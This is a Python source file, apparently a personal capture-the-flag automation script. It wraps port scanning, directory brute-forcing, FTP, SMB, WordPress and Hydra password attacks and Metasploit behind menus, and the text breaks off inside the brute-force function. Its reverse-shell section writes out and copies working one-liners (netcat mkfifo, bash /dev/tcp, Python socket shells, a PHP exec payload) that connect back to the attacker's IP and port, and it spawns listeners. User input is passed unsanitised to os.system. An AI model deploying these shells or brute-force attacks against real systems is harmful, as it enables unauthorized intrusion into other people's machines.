#!/bin/python3
"""

Created by Yerom Hemo
date: 24-01-2021

This script is coming to automate the common command you type when playing CTF like nmap, gobuster, steghide, ftp, ssh, etc....

"""

import sys
import json
import subprocess
import os
import colorama
from colorama import Fore, Back
import pyfiglet
import pyperclip
import pty
import nc_shell
import steb_shell


def main(attacker_ip, target_ip, file_save):
    space = "                   "
    try:
        print(yellow + pyfiglet.figlet_format("ctf  lazy  script"))
        print("Your IP is: " + green + attacker_ip + normal)
        print("\nTarget ip: " + red + target_ip + '\n' + normal)
        print("Your files will be save here: " + yellow + file_save + "\n" + normal)
        print("Your current path is: " + blue + os.popen('pwd').read() + normal)
        option_choose = input(f"""{red}0:{normal}  exit
{green}1:{normal}  Port Enumeration {space} {green}12:{normal} SMB
{green}2:{normal}  Web {space}              {green}13:{normal} WPscan
{green}3:{normal}  Ftp
{green}4:{normal}  Reverse Shell and Listener
{green}5:{normal}  See Scans Results
{green}6:{normal}  Forensic
{green}7:{normal}  Hydra
{green}8:{normal}  Found credentials
{green}9:{normal}  Connect to a ssh session
{green}10:{normal} Metasploit
{green}11:{normal} Credentials file
{yellow}99: Interactive shell
{normal}{green}>  {normal}""")

        if option_choose == '0':
            print(yellow + pyfiglet.figlet_format("Good  bye"))
            sys.exit()

        elif option_choose == '1':
            ports_enum(target_ip)

        elif option_choose == '2':
            web_enum(target_ip)

        elif option_choose == '3':
            ftp_connect(target_ip)

        elif option_choose == '4':
            reverse_shell(attacker_ip)

        elif option_choose == '5':
            results(file_save)

        elif option_choose == '6':
            forensics(file_save)

        elif option_choose == '7':
            brute_force(target_ip, file_save)

        elif option_choose == '8':
            found_creds(file_save)

        elif option_choose == '9':
            ssh_connect(target_ip)

        elif option_choose == '10':
            metasploit(target_ip)

        elif option_choose == '11':
            change_user_file(file_save)

        elif option_choose == '12':
            smb(target_ip, file_save)

        elif option_choose == '13':
            wordpress(target_ip, file_save)

        elif option_choose == '99':
            interactive_shell()

        else:
            print(error + "You entered a wrong value!!!" + normal)
            main(attacker_ip, target_ip, file_save)

    except KeyboardInterrupt:
        out = input("\nAre you sure you want to exit? Y/n > ")
        if out.lower() == 'y' or out == '':
            print('\n')
            print(yellow + pyfiglet.figlet_format("Good  bye"))
            sys.exit()
        else:
            main(attacker_ip, target_ip, file_save)

    except Exception as e:
        print(e)
        print(red + "[-] There was an error")
        main(attacker_ip, target_ip, file_save)


def metasploit(target_ip):
    print(red + pyfiglet.figlet_format("Metasploit") + normal)
    print(green + "Starting metasploit" + normal)
    os.system(f"""terminator -T 'Metasploit-Framework' -e 'msfconsole -x "setg RHOSTS {target_ip};setg RHOST {target_ip};setg LHOST {attacker_ip}"'""")
    main(attacker_ip, target_ip, file_save)


def interactive_shell():
    menu = input(yellow + "What shell do you want?\n" + normal + "0: Back to main menu\n1: zsh\n2: bash\n3: root shell\n4: external terminal\n> " + normal)

    if menu == '0':
        main(attacker_ip, target_ip, file_save)

    elif menu == "1":
        print(green + "[+] Spawning a zsh shell...\n	Type 'exit' to come back to script...")
        pty.spawn("/bin/zsh")

    elif menu == '2':
        print(green + "[+] Spawning a bash shell...\n	Type 'exit' to come back to script...")
        pty.spawn("/bin/bash")

    elif menu == '3':

        what_shell = input(yellow + "What shell do you want?\n1: zsh\n2: bash\n> ")
        if what_shell == "1":
            print(green + "[+] Spawning a zsh root shell...\n	Type 'exit' to come back to script...")
            os.system("/bin/zsh -c 'sudo su'")
        elif what_shell == '2':
            print(green + "[+] Spawning a bash root shell...\n	Type 'exit' to come back to script...")
            os.system("/bin/bash -c 'sudo su'")

    elif menu == '4':
        menu = input(yellow + "What shell do you want?\n" + normal + "0: Back to main menu\n1: zsh\n2: bash\n3: root shell\n> " + normal)
        if menu == '0':
            main(attacker_ip, target_ip, file_save)

        elif menu == "1":
            print(green + "[+] Spawning a zsh shell...\n	Type 'exit' to come back to script...")
            os.system(f"terminator -T 'ZSH Interactive Shell' -e '/bin/zsh'")

        elif menu == '2':
            print(green + "[+] Spawning a bash shell...\n	Type 'exit' to come back to script...")
            os.system(f"terminator -T 'Bash Interactive Shell' -e '/bin/bash'")

        elif menu == '3':

            print(green + "[+] Spawning a root shell...\n")
            os.system(f"terminator -T 'Root Interactive Shell' -e 'sudo su'")

    else:
        print(error + "Choose something" + normal)
        interactive_shell()

    main(attacker_ip, target_ip, file_save)


def web_enum(target_ip):
    print(red + pyfiglet.figlet_format(" Web  Enumeration ") + normal)
    menu = input(yellow + "What do you want to do?\n" + normal + "0: Back to main menu\n1: web enumeration\n2: Open web server page\n3: Open GTFOBins\n4: Open CyberChef\n5: Open CreackStation\n6: Edit /etc/hosts file\n> ")

    if menu == '0':
        main(attacker_ip, target_ip, file_save)
    elif menu == '1':
        menu_2 = input(yellow + "What do you want to do?\n" + normal + "0: Back to main menu\n1: Default scan\n2: Normal scan\n3: Go recursive on a directory\n4: Web on different port then 80\n5: Scan a domain name\n6: Scan a custum URL\n> ")
        if menu_2 == '0':
            main(attacker_ip, target_ip, file_save)

        elif menu_2 == '1':
            os.system(
                f"""terminator -T 'GoBuster Default Scan' -e 'gobuster dir -u http://{target_ip}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 100 -r -x php,txt,zip,js,css -o {file_save}/Gscan_Default;echo "\n\033[1;33mPress ENTER to continue";read''""")

        elif menu_2 == '2':
            fast_or_not = input("Do you want to go [F]ast [M]edium or [S]low > ")
            x = input("Any extensions you want to add (if none press enter else demo: php,txt,et...) \n> ")
            if x == '':
                x = 'php'
            if fast_or_not == 'f' or fast_or_not == 'F':
                print(red + "It may not show all the directories!!")
                print(green + "[+] Running GoBuster:")
                os.system(f"""terminator -T 'Gobuster Fast' -e 'gobuster dir -u http://{target_ip}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 100 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 'm' or fast_or_not == 'M':
                print(red + "It may not show all the directory!!")
                print(green + "[+] Running GoBuster:")
                os.system(f"""terminator -T 'Gobuster Medium' -e 'gobuster dir -u http://{target_ip}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 50 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 's' or fast_or_not == 'S':
                print(yellow + "Slow is safe!!")
                print(green + "[+] Running GoBuster:")
                os.system(f"""terminator -T 'Gobuster Slow' -e 'gobuster dir -u http://{target_ip}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 30 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

        elif menu_2 == '3':
            with open(f"{file_save}/Gscan", 'r') as lines:
                for line in lines.readlines():
                    if "(Status: 200)" and ("Status: 301") in line.strip():
                        print(line)
                dire = input("Enter the directory you want (example: directory, don't forget to add '/'!!) > ")
                x = input("Any extensions you want to add (if none press enter else demo: php,txt,et...) \n> ")
                if x == '':
                    x = 'php'
                os.system(
                    f"""terminator -T 'Gobuster Recursive' -e 'gobuster dir -u http://{target_ip}{dire} -w /opt/wordlist/directory-list-2.3-medium.txt -r -x {x} -t 40 -o Gscan_after_200_follow;echo "\n\033[1;33mPress ENTER to continue";read'""")

        elif menu_2 == '4':
            what_port = input("enter port number > ")
            menu_3 = input(
                "0: Back to main menu\n1: Default scan\n2: Normal scan\n3: Recursive scan\n4: Domain scan\n> ")
            if menu_3 == '0':
                main(attacker_ip, target_ip, file_save)

            elif menu_3 == '1':
                os.system(f"""terminator -T 'GoBuster Default Scan Different Port' -e 'gobuster dir -u http://{target_ip}:{what_port}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 50 -r -x php,txt,zip,js,css -o {file_save}/Gscan_Default;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif menu_3 == '2':

                fast_or_not = input("Do you want to go [F]ast [M]edium or [S]low > ")
                x = input("Any extensions you want to add (if none press enter else demo: php,txt,et...) \n> ")
                if x == '':
                    x = 'php'

                if fast_or_not == 'f' or fast_or_not == 'F':
                    print(red + "It may not show all the directories!!")
                    print(green + "[+] Running GoBuster:")
                    os.system(f"""terminator -T 'Gobuster Different Port Fast' -e 'gobuster dir -u http://{target_ip}:{what_port}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 100 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

                elif fast_or_not == 'm' or fast_or_not == 'M':
                    print(red + "It may not show all the directories!!")
                    print(green + "[+] Running GoBuster:")
                    os.system(f"""terminator -T 'Gobuster Different Port Medium' -e 'gobuster dir -u http://{target_ip}:{what_port}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 50 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

                elif fast_or_not == 's' or fast_or_not == 'S':
                    print(yellow + "Slow is safe!!")
                    print(green + "[+] Running GoBuster:")
                    os.system(f"""terminator -T 'Gobuster Different Port Slow' -e 'gobuster dir -u http://{target_ip}:{what_port}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 20 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif menu_3 == '3':
                with open(f"{file_save}/Gscan", 'r') as lines:
                    for line in lines.readlines():
                        if "(Status: 200)" and "(Status: 301)" in line.strip():
                            print(line)
                dire = input("Enter the directory you want (example: directory, don't forget to add '/'!!) > ")
                x = input("Any extensions you want to add (if none press enter else demo: php,txt,et...) \n> ")
                if x == '':
                    x = 'php'
                os.system(f"""terminator -T 'Gobuster Different Port Recursive' -e 'gobuster dir -u http://{target_ip}:{what_port}{dire} -w /opt/wordlist/directory-list-2.3-medium.txt -x {x} -t 40 -o Gscan_after_200_follow;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif menu_3 == '4':
                domain = input("Enter domain name > ")
                fast_or_not = input("Do you want to go [F]ast [M]edium or [S]low > ")
                x = input("Any extensions you want to add (if none press enter else demo: php,txt,et...) \n> ")
                if x == '':
                    x = 'php'
                if fast_or_not == 'f' or fast_or_not == 'F':
                    print(red + "It may not show all the directories!!")
                    print(green + "[+] Running GoBuster:")
                    os.system(f"""terminator -T 'Gobuster Fast' -e 'gobuster dir -u http://{domain}:{what_port}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 100 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

                elif fast_or_not == 'm' or fast_or_not == 'M':
                    print(red + "It may not show all the directory!!")
                    print(green + "[+] Running GoBuster:")
                    os.system(f"""terminator -T 'Gobuster Medium' -e 'gobuster dir -u http://{domain}:{what_port}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 50 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

                elif fast_or_not == 's' or fast_or_not == 'S':
                    print(yellow + "Slow is safe!!")
                    print(green + "[+] Running GoBuster:")
                    os.system(f"""terminator -T 'Gobuster Slow' -e 'gobuster dir -u http://{domain}:{what_port}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 30 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

        elif menu_2 == '5':
            domain = input("Enter domain name > ")
            fast_or_not = input("Do you want to go [F]ast [M]edium or [S]low > ")
            x = input("Any extensions you want to add (if none press enter else demo: php,txt,et...) \n> ")
            if x == '':
                x = 'php'
            if fast_or_not == 'f' or fast_or_not == 'F':
                print(red + "It may not show all the directories!!")
                print(green + "[+] Running GoBuster:")
                os.system(f"""terminator -T 'Gobuster Fast' -e 'gobuster dir -u http://{domain}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 100 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 'm' or fast_or_not == 'M':
                print(red + "It may not show all the directory!!")
                print(green + "[+] Running GoBuster:")
                os.system(f"""terminator -T 'Gobuster Medium' -e 'gobuster dir -u http://{domain}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 50 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 's' or fast_or_not == 'S':
                print(yellow + "Slow is safe!!")
                print(green + "[+] Running GoBuster:")
                os.system(f"""terminator -T 'Gobuster Slow' -e 'gobuster dir -u http://{domain}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 30 -r -x {x} -o {file_save}/Gscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

        elif menu_2 == '6':
            costume = input("Enter costume URL > ")
            x = input("Any extensions you want to add (if none press enter else demo: php,txt,et...) \n> ")
            if x == '':
                x = 'php'
            os.system(f"""terminator -T 'Gobuster Costume URL' -e 'gobuster dir -u http://{costume}/ -w /opt/wordlist/directory-list-2.3-medium.txt -t 50 -r -x {x} -o {file_save}/Gscan_costume_URL;echo "\n\033[1;33mPress ENTER to continue";read'""")
    elif menu == '2':
        print(red + pyfiglet.figlet_format("Open web browser") + normal)
        menu_4 = input("0: Back to main menu\n1: Open web server page port 80\n2: Web server is on different port\n3: Open domain page\n4: Open domain page on different port\n> ")

        if menu_4 == '0':
            main(attacker_ip, target_ip, file_save)

        elif menu_4 == '1':
            os.system(f"firefox {target_ip}")

        elif menu_4 == '2':
            what_port = input("What port is the server is on? > ")
            os.system(f"firefox {target_ip}:{what_port}")

        elif menu_4 == '3':
            domain = input("Enter the domain name > ")
            os.system(f"firefox {domain}")

        elif menu_4 == '4':
            domain = input("Enter the domain name > ")
            what_port = input("What port is the server is on? > ")
            os.system(f"firefox {domain}:{what_port}")

    elif menu == '3':
        os.system("firefox https://gtfobins.github.io/")

    elif menu == '4':
        os.system("firefox https://gchq.github.io/CyberChef/")

    elif menu == '5':
        os.system("firefox https://crackstation.net/")

    elif menu == '6':
        os.system("terminator -T 'Hosts file config' -e 'sudo nano /etc/hosts'")

    else:
        print(error + "Choose something" + normal)
        web_enum(target_ip)

    main(attacker_ip, target_ip, file_save)


def ports_enum(target_ip):
    print(red + pyfiglet.figlet_format("Ports  Enumeration ") + normal)
    try:
        menu = input(yellow + "What do you want to do?\n" + normal + "0: Back to main menu\n1: Default scan        (Will work on windows machine)\n2: Windows scans\n3: Linux scans\n> ")

        if menu == '0':
            main(attacker_ip, target_ip, file_save)
        elif menu == '1':
            print(f"Will be running default scan? " + red + f"'sudo rustscan -b 250 -a {target_ip} -- -Pn -sV --script=vuln -O --traceroute -oN {file_save}/Rscan_Default'" + normal + "\n")
            os.system(f"""terminator -T 'RustScan Default' -e 'sudo rustscan -b 250 -a {target_ip} -- -Pn -sV --script=vuln -O --traceroute -oN {file_save}/Rscan_Default;echo "\n\033[1;33mPress ENTER to continue";read'""")
            main(attacker_ip, target_ip, file_save)

        elif menu == '2':
            print(red + "Windows scanning" + normal)
            fast_or_not = input("Do you want to go [F]ast [M]edium or [S]low? \n> ")

            if fast_or_not == 'f' or fast_or_not == 'F':
                print(red + "It may not show all the ports and may crush the server!!")
                print(green + "[+] Running rustscan:")
                os.system(f"""terminator -T 'RustScan Windows Fast' -e 'rustscan -b 550 -a {target_ip} -- -Pn -sV -sC -oN {file_save}/Rscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 'm' or fast_or_not == 'M':
                print(red + "It may not show all the ports!!")
                print(green + "[+] Running rustscan:")
                os.system(f"""terminator -T 'RustScan Windows Medium' -e 'rustscan -b 250 -a {target_ip} -- -Pn -sV -sC -oN {file_save}/Rscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 's' or fast_or_not == 'S':
                print(yellow + "Slow is safe!!")
                print(green + "[+] Running rustscan:")
                os.system(f"""terminator -T 'RustScan Windows Slow' -e 'rustscan -b 50 -a {target_ip} -- -Pn -sV -sC -oN {file_save}/Rscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            main(attacker_ip, target_ip, file_save)

        elif menu == '3':
            print(red + "Linux Scanning" + normal)
            fast_or_not = input("Do you want to go [F]ast [M]edium or [S]low? \n> ")

            if fast_or_not == 'f' or fast_or_not == 'F':
                print(red + "It may not show all the ports and may crush the server!!")
                print(green + "[+] Running rustscan:")
                os.system(f"""terminator -T 'RustScan Linux Fast' -e 'rustscan -b 550 -a {target_ip} -- -sV -sC -oN {file_save}/Rscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 'm' or fast_or_not == 'M':
                print(red + "It may not show all the ports!!")
                print(green + "[+] Running rustscan:")
                os.system(f"""terminator -T 'RustScan Linux Medium' -e 'rustscan -b 250 -a {target_ip} -- -sV -sC -oN {file_save}/Rscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            elif fast_or_not == 's' or fast_or_not == 'S':
                print(yellow + "Slow is safe!!")
                print(green + "[+] Running rustscan:")
                os.system(f"""terminator -T 'RustScan Linux Slow' -e 'rustscan -b 50 -a {target_ip} -- -sV -sC -oN {file_save}/Rscan;echo "\n\033[1;33mPress ENTER to continue";read'""")

            main(attacker_ip, target_ip, file_save)

        else:
            print(error + "Choose something" + normal)
            ports_enum(target_ip)
    except KeyboardInterrupt:
        main(attacker_ip, target_ip, file_save)

    main(attacker_ip, target_ip, file_save)


def ftp_connect(target_ip):
    print(red + pyfiglet.figlet_format("FTP connection") + normal)
    menu = input(yellow + "What do you want to do?\n" + normal + "0: Back to main menu\n1: Anonymous login\n2: Regular connect\n3: FTP on a different port\n4: Upload a file to ftp server\n> ")

    if menu == "0":
        main(attacker_ip, target_ip, file_save)

    elif menu == '1':
        print(green + "Checking if ftp anonymous is possible: ")
        os.system(f"nmap -Pn -p 21 --script ftp-anon {target_ip}")
        possible = input("if its possible then connect to it and do 'ls -la and pwd'.\n is it possible? Y/n > ")
        if possible == 'y' or possible == 'Y':
            os.system(f"""terminator -T 'FTP Anonymous Login' -e 'ftp {target_ip};echo "\n\033[1;33mPress ENTER to continue";read'""")
        elif possible == 'n' or possible == 'N':
            print(red + "Try Harder!!" + normal)
        else:
            print(error + "You entered something wrong" + normal)
            ftp_connect(target_ip)

    elif menu == '2':
        print(green + "Starting connection")
        os.system(f"""terminator -T 'FTP login' -e 'ftp {target_ip};echo "\n\033[1;33mPress ENTER to continue";read'""")

    elif menu == '3':
        port = input("Enter port number > ")
        os.system(f"terminator -T 'FTP With A Different Port' -e 'ftp {target_ip} {port}'")

    elif menu == '4':
        os.system("ls -l")
        file_to_upload = input("What file do you want to upload? > ")
        os.system(f"nmap -p 21 --script ftp-anon {target_ip}")
        destination = input("Where do you want to upload to? > ")
        user_name = input("Enter user name > ")
        password = input("Enter password                         --For anonymous login press enter.\n> ")
        if password == '':
            password = "anonymous"
        print(green + "Uploading...")
        os.system(f"""terminator -T 'FTP Upload File' -e 'ftp-upload -h {target_ip} -u {user_name} --password {password} -d {destination} {file_to_upload};echo "\n\033[1;33mPress ENTER to continue";read'""")

    else:
        print(red + "Choose something" + normal)
        ftp_connect(target_ip)

    main(attacker_ip, target_ip, file_save)


def wordpress(target_ip, file_save):
    path = input("Enter wordpress URL path                      --Press ENTER for none\n>  ")
    menu = input("What do you want to do?\n0: Back to main menu\n1: User name enumeration\n2: Password attack\n3: Wordpress on a different port\n> ")
    if menu == '0':
        main(attacker_ip, target_ip, file_save)

    elif menu == '1':
        os.system(f"""terminator -T 'WordPress user name enumeration' -e 'wpscan --no-update --url http://{target_ip}/{path} -e u --output {file_save}/wp.log;echo "\n\033[1;33mPress ENTER to continue";read'""")
    elif menu == '2':
        pass_file = input("Enter wordlist full path > ")
        input("You will not see the password progress it is ok you can find it on the menu number 5 under wp resutls :)\nPress ENTER to continue")
        os.system(f"""terminator -T 'WordPress user name enumeration' -e 'wpscan --no-update --url http://{target_ip}/{path} -e u -P {pass_file} --output {file_save}/wp.log;echo "\n\033[1;33mPress ENTER to continue";read'""")
    elif menu == '3':
        port = input("Enter port number > ")
        menu = input("What do you want to do?\n0: Back to main menu\n1: User name enumeration\n2: Password attack\n3: Wordpress on a different port\n> ")
        if menu == '0':
            main(attacker_ip, target_ip, file_save)
        elif menu == '1':
            os.system(f"""terminator -T 'WordPress user name enumeration' -e 'wpscan --no-update --url http://{target_ip}:{port}/{path} -e u --output {file_save}/wp.log;echo "\n\033[1;33mPress ENTER to continue";read'""")
        elif menu == '2':
            pass_file = input("Enter wordlist full path > ")
            input("You will not see the password progress it is ok you can find it on the menu number 5 under wp resutls :)\nPress ENTER to continue")
            os.system(f"""terminator -T 'WordPress user name enumeration' -e 'wpscan --no-update --url http://{target_ip}:{port}/{path} -e u -P {pass_file} --output {file_save}/wp.log'""")
    else:
        print(error + "Please choose something..." + normal)
        wordpress(target_ip, file_save)

    main(attacker_ip, target_ip, file_save)


def smb(target_ip, file_save):
    print(red + pyfiglet.figlet_format("SMB") + normal)
    menu = input("What do you want to do?\n0: Back to main menu\n1: enumerate smb shares and users                     --enum4linux\n2: connect to smb share directory\n3: connect to smb anonymouse\n> ")
    if menu == '0':
        main(attacker_ip, target_ip, file_save)

    elif menu == '1':
        os.system(f"""terminator -T 'Enum4Linux' -e 'enum4linux {target_ip} | tee {file_save}/smb_enum.log;echo "\n\033[1;33mPress ENTER to continue";read'""")

    elif menu == '2':
        os.system(f"smbclient -L {target_ip}")
        share = input("Enter share name > ")
        username = input("Enter the username > ")
        os.system(f"""terminator -T 'SMB Connect' -e 'smbclient //{target_ip}/{share} --user={username} ;echo "\n\033[1;33mPress ENTER to continue";read'""")

    elif menu == '3':
        os.system(f"smbclient -L {target_ip}")
        share = input("Enter share name > ")
        os.system(f"""terminator -T 'SMB Anonymous Connect' -e 'smbclient //{target_ip}/{share};echo "\n\033[1;33mPress ENTER to continue";read'""")

    else:
        print(error + "Please choose something..." + normal)
        smb(target_ip, file_save)

    main(attacker_ip, target_ip, file_save)


def reverse_shell(attacker_ip):
    port = input(green + "Enter the port you want to listen on > " + normal)
    if int(port) < 1 or int(port) > 65535:
        print(error + "You can't do that port number" + normal)
        reverse_shell(attacker_ip)

    elif len(port) > 5:
        print(error + "You can't do that port number" + normal)
        reverse_shell(attacker_ip)

    else:
        pass

    menu = input(yellow + "What do you need?\n" + normal + "0: Back to main menu\n1: Reverse Shell\n2: Listener\n3: NetCat Stebilize Shell\n> ")

    if menu == '0':
        main(attacker_ip, target_ip, file_save)

    elif menu == '1':
        print(red + pyfiglet.figlet_format("Reverse Shell") + normal)
        shell_menu = input(yellow + "What reverse shell do you want?\n" + normal + "1: Netcat reverse shell\n2: Bash reverse shell\n3: Python2 reverse shell\n4: python3 reverse shell\n5: php reverse shell\n6: Burp php one liner reverse shell\n> ")
        if shell_menu == '1':
            print(green + 'Copying: ' + normal + '"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + green + f'{attacker_ip} {port}' + normal + ' > /tmp/f"')
            pyperclip.copy(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} > /tmp/f")
            print(green + "[+] Copied to your clipboard")
            listener = input("Do you want a listener? Y/n \n> ")
            if listener == 'y' or listener == 'Y':
                print(green + f"your listening ip {attacker_ip}")
                listener_menu = input(
                    yellow + "What listener do you need?\n" + normal + "1: netcat listener\n2: pwncat listener\n> ")
                if listener_menu == '1':
                    #os.system(f"terminator -T 'NetCat' -e 'nc -lnvp {port}'")
                    nc_shell.main(port)

                elif listener_menu == '2':
                    os.system(f"terminator -e 'pwncat -lp {port}'")

        elif shell_menu == '2':
            print(green + "Copying: " + normal + "'bash -i >& /dev/tcp/" + green + f"{attacker_ip}/{port}" + normal + " 0>&1'")
            pyperclip.copy(f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1")
            print(green + "[+] Copied to your clipboard")
            listener = input("Do you want a listener? Y/n \n> ")
            if listener == 'y' or listener == 'Y':
                print(green + f"your listening ip {attacker_ip}")
                listener_menu = input(yellow + "What listener do you need?\n" + normal + "1: netcat listener\n2: pwncat listener\n> ")
                if listener_menu == '1':
                    #os.system(f"terminator -T 'NetCat' -e 'nc -lnvp {port}'")
                    nc_shell.main(port)

                elif listener_menu == '2':
                    os.system(f"terminator -T 'PwnCat' -e 'pwncat -lp {port}'")

        elif shell_menu == '3':
            print(green + "Copying: " + normal + f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
            pyperclip.copy(f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
            print(green + "[+] Copied to your clipboard")
            listener = input("Do you want a listener? Y/n \n> ")
            if listener == 'y' or listener == 'Y':
                print(green + f"your listening ip {attacker_ip}")
                listener_menu = input(yellow + "What listener do you need?\n" + normal + "1: netcat listener\n2: pwncat listener\n> ")
                if listener_menu == '1':
                    #os.system(f"terminator -T 'NetCat' -e 'nc -lnvp {port}'")
                    nc_shell.main(port)

                elif listener_menu == '2':
                    os.system(f"terminator -T 'PwnCat' -e 'pwncat -lp {port}'")

        elif shell_menu == '4':
            print(green + "Copying: " + normal + f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
            pyperclip.copy(f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
            print(green + "[+] Copied to your clipboard")
            listener = input("Do you want a listener? Y/n \n> ")
            if listener == 'y' or listener == 'Y':
                print(green + f"your listening ip {attacker_ip}")
                listener_menu = input(yellow + "What listener do you need?\n" + normal + "1: netcat listener\n2: pwncat listener\n> ")
                if listener_menu == '1':
                    #os.system(f"terminator -T 'NetCat' -e 'nc -lnvp {port}'")
                    nc_shell.main(port)

                elif listener_menu == '2':
                    os.system(f"terminator -T 'PwnCat' -e 'pwncat -lp {port}'")

        elif shell_menu == '5':
            os.system("cat /opt/php-reverse-shell.php | xclip -selection clipboard")
            print(green + "[+] Copied to your clipboard" + normal)
            input(yellow + "You need to add your ip and port on the source code!!!!\nPerss ENTER to continue" + normal)
            listener = input("Do you want a listener? Y/n \n> ")
            if listener == 'y' or listener == 'Y':
                print(green + f"your listening ip {attacker_ip}")
                listener_menu = input(yellow + "What listener do you need?\n" + normal + "1: netcat listener\n2: pwncat listener\n> ")
                if listener_menu == '1':
                    #os.system(f"terminator -T 'NetCat' -e 'nc -lnvp {port}'")
                    nc_shell.main(port)

                elif listener_menu == '2':
                    os.system(f"terminator -T 'PwnCat' -e 'pwncat -lp {port}'")

        elif shell_menu == '6':
            print(green + f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'"); ?>""" + normal)
            pyperclip.copy(f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'"); ?>""")
            print(green + "[+] Copied to your clipboard")
            listener = input("Do you want a listener? Y/n \n> ")
            if listener == 'y' or listener == 'Y':
                print(green + f"your listening ip {attacker_ip}")
                listener_menu = input(yellow + "What listener do you need?\n" + normal + "1: netcat listener\n2: pwncat listener\n> ")
                if listener_menu == '1':
                    #os.system(f"terminator -T 'NetCat' -e 'nc -lnvp {port}'")
                    nc_shell.main(port)

                elif listener_menu == '2':
                    os.system(f"terminator -T 'PwnCat' -e 'pwncat -lp {port}'")

    elif menu == '2':
        print(red + pyfiglet.figlet_format("Listener") + normal)
        print(green + f"your listening ip {attacker_ip}")
        listener_menu = input(yellow + "What listener do you need?\n" + normal + "1: netcat listener\n2: pwncat listener\n> ")
        if listener_menu == '1':
            #os.system(f"terminator -T 'NetCat' -e 'nc -lnvp {port}'")
            nc_shell.main(port)

        elif listener_menu == '2':
            os.system(f"terminator -T 'PwnCat' -e 'pwncat -lp {port}'")

    elif menu == '3':
        input("Please make sure that you nc listiner was the last window you clicked on...\nPress enter to continue")
        steb_shell.main()

    main(attacker_ip, target_ip, file_save)


def brute_force(target_ip, file_save):
    print(red + pyfiglet.figlet_format("Brute Force") + normal)
    attack_style = input(yellow + "What attack do you need?\n" + normal + "0: Back to main menu\n1: User list attack\n2: Password list attack\n> ")
    if attack_style == '0':
        main(attacker_ip, target_ip, file_save)
    elif attack_style == '1':
        protocol = input("Enter the protocol you need > ")
        port = input("Enter protocol's port number > ")
        user_list = input("Enter user list file path > ")
        pass_list = input("Enter password list file path > ")
        os.system(f"""terminator -T 'Brute Force User List Attack' -e 'hydra -L {user_list} -P {pass_list} {protocol}://{target_ip}:{port};echo "\n\033[1;33mPress ENTER to continue";read'""")
        found = input("Did you found something? Y/n > ")
        if found == 'y' or found == 'Y':
            user_name = input("Enter the user name you found > ")
            pass_found = input("Enter the password you found > ")
            os.system(f"""echo "'username': {user_name}, 'password': {pass_found}" > {file_save}/Creds""")
        else:
            print(green + "Try something else then mate" + normal)
    elif attack_style == '2':
        protocol = input("Enter the protocol you need > ")
        port = input("Enter protocol's port number > ")
        user_name = input("Enter user name > ")
        pass_list = input("Enter password list file path > ")
